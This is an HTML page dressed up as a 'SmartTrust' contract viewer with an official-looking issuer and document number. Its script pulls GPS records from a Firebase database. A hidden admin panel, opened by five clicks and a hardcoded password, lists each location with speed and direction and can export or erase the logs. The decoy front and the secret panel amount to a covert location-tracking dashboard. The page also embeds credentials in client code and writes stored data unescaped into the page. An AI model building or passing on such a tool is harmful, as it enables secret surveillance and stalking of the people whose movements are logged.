<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SmartTrust Viewer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #f5f5f5;
      font-family: 'Segoe UI', sans-serif;
      margin: 0; padding: 0;
    }
    .header {
      background: #1c1c1c;
      color: white;
      padding: 15px;
      text-align: center;
    }
    .content {
      padding: 30px;
      max-width: 800px;
      margin: auto;
      background: white;
      margin-top: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .contract-title {
      font-size: 20px;
      font-weight: bold;
      margin-top: 20px;
    }
    .footer {
      text-align: center;
      margin-top: 50px;
      color: #888;
    }
    .location-box {
      margin-top: 30px;
      background: #f0f0f0;
      padding: 15px;
      border-left: 5px solid #00b894;
      font-family: monospace;
    }

    /* Admin Panel (hidden by default) */
    .admin-panel {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #0e0e0e;
      color: white;
      padding: 30px;
      overflow-y: auto;
      z-index: 9999;
    }
    .admin-panel h2 {
      color: #00ffcc;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      border: 1px solid #777;
      padding: 8px;
      font-size: 14px;
    }
    .btn {
      background: #00ffcc;
      color: #000;
      border: none;
      padding: 10px 15px;
      margin: 10px 5px;
      cursor: pointer;
    }
    .hidden-input {
      display: none;
    }
    #loginBox {
      background: #222;
      color: white;
      padding: 20px;
      width: 300px;
      margin: 100px auto;
      text-align: center;
      display: none;
      box-shadow: 0 0 10px #00ffcc;
    }
    input[type="password"] {
      padding: 8px;
      width: 90%;
      margin: 10px 0;
    }
  </style>
</head>
<body>

<div class="header">
  <h2>SmartTrust Viewer</h2>
  <p>Last seen: <span id="lastSeen">Loading...</span></p>
</div>

<div class="content" id="viewerContent">
  <p><strong>Contract A</strong><br>
  <strong>Contract B</strong><br>
  <strong>Legal Info</strong></p>

  <div class="contract-title">SmartCheck Contract Viewer</div>
  <p><strong>Document:</strong> SC-024/NGX-CON</p>
  <p><strong>Status:</strong> Active</p>
  <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
  <p><strong>Effective Date:</strong> August 1, 2025</p>
  <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>

  <div class="location-box" id="locationBox">
    Lat: <span id="lat">...</span>, Lng: <span id="lng">...</span>
  </div>
</div>

<div class="footer">
  <p>¬© 2025 SmartTrust. All rights reserved.</p>
</div>

<!-- Hidden Admin Panel -->
<div id="loginBox">
  <h3>Admin Login</h3>
  <input type="password" id="adminPass" placeholder="Enter password" />
  <button class="btn" onclick="verifyLogin()">Enter</button>
</div>

<div class="admin-panel" id="adminPanel">
  <h2>Admin Panel ‚Äì Location Logs</h2>
  <button class="btn" onclick="clearLogs()">üóë Clear Logs</button>
  <button class="btn" onclick="exportCSV()">üìÅ Export CSV</button>
  <table>
    <thead>
      <tr><th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th></tr>
    </thead>
    <tbody id="logTable"></tbody>
  </table>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-database-compat.js"></script>

<script>
  // Firebase config (replace with yours)
  const firebaseConfig = {
    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
    authDomain: "gps-d0bab.firebaseapp.com",
    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
    projectId: "gps-d0bab",
    storageBucket: "gps-d0bab.appspot.com",
    messagingSenderId: "810816177909",
    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  const locationRef = db.ref("locations");

  // Viewer location
  locationRef.limitToLast(1).on("child_added", (snap) => {
    const data = snap.val();
    document.getElementById("lat").textContent = data.lat || "N/A";
    document.getElementById("lng").textContent = data.lng || "N/A";
    document.getElementById("lastSeen").textContent = new Date(data.timestamp).toLocaleString();
  });

  // Admin panel logs
  locationRef.on("child_added", (snap) => {
    const d = snap.val();
    const row = `<tr>
      <td>${new Date(d.timestamp).toLocaleString()}</td>
      <td>${d.lat}</td>
      <td>${d.lng}</td>
      <td>${d.speed || "0"}</td>
      <td>${d.direction || "N/A"}</td>
    </tr>`;
    document.getElementById("logTable").innerHTML += row;
  });

  // Admin reveal logic
  let tapCount = 0;
  document.body.addEventListener("click", () => {
    tapCount++;
    if (tapCount >= 5) {
      document.getElementById("loginBox").style.display = "block";
      tapCount = 0;
    }
    setTimeout(() => tapCount = 0, 4000);
  });

  function verifyLogin() {
    const pass = document.getElementById("adminPass").value;
    if (pass === "ASCII") {
      document.getElementById("loginBox").style.display = "none";
      document.getElementById("adminPanel").style.display = "block";
    } else {
      alert("Wrong password");
    }
  }

  function clearLogs() {
    if (confirm("Clear all logs?")) {
      locationRef.remove();
      document.getElementById("logTable").innerHTML = "";
    }
  }

  function exportCSV() {
    let csv = "Time,Lat,Lng,Speed,Direction\n";
    locationRef.once("value", (snap) => {
      snap.forEach(child => {
        const d = child.val();
        csv += `"${new Date(d.timestamp).toLocaleString()}","${d.lat}","${d.lng}","${d.speed || 0}","${d.direction || 'N/A'}"\n`;
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = "logs.csv";
      a.click();
    });
  }
</script>
</body>
  </html>
